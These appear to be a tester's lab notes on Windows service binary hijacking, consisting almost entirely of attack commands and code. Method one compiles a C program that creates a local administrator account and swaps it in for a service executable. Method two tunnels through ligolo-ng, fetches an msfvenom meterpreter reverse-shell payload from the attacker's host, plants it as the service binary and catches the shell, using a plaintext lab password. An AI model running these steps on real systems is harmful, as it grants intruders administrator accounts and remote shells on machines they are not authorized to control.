## service binary hijack 
### method 1 (cannnot obtain root)
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```
upload adduser.exe adduser.exe
```

```
move C:\DevelopmentExecutables\auditTracker.exe C:\Users\wario\auditTracker.exe
```

```
move .\adduser.exe C:\DevelopmentExecutables\auditTracker.exe
```

start service
```
sc.exe start auditTracker
```

check localgroup member
```
Get-LocalGroupMember administrators
```

### method 2
get system reverse shell using ligolo-ng tunneling and msfvenom payload

download ligolo-ng proxy and agnet
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz

tar -xzvf ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz 
```

```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip 

unzip ligolo-ng_agent_0.5.2_windows_amd64.zip 
```

set proxy
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

upload agent to WEB02 (windows)
```
iwr -UseBasicParsing http://192.168.45.167:8080/agent.exe -outfile agent.exe
```

connect to proxy (windows)
```
.\agent.exe -connect 192.168.45.167:11601 -ignore-cert
```

start session
```
session
```

add route (another terminal)
```
sudo ip route add 172.16.219.0/24 dev ligolo
```

ligolo-ng start
```
start
```


```
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8080
```

create payload msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.219.254 LPORT=3321 -f exe-service -o payload.exe
```

connect to client02 with evil-winrm
```
evil-winrm -i 172.16.219.83 -u wario -p "Mushroom\!" 
```

```
rm C:\Users\wario\auditTracker.exe
iwr -UseBasicParsing http://172.16.219.254:1235/payload.exe -outfile a.exe
```

```
move C:\DevelopmentExecutables\auditTracker.exe C:\Users\wario\auditTracker.exe
move .\a.exe C:\DevelopmentExecutables\auditTracker.exe
```

```
msfconsole -q -x 'use exploit/multi/handler;set LHOST 0.0.0.0;set LPORT 3321;set payload windows/x64/meterpreter/reverse_tcp;run'
```

ligolo-ng
```
listener_add --addr 0.0.0.0:3321 --to 0.0.0.0:3321
```

start service
```
sc.exe start auditTracker
```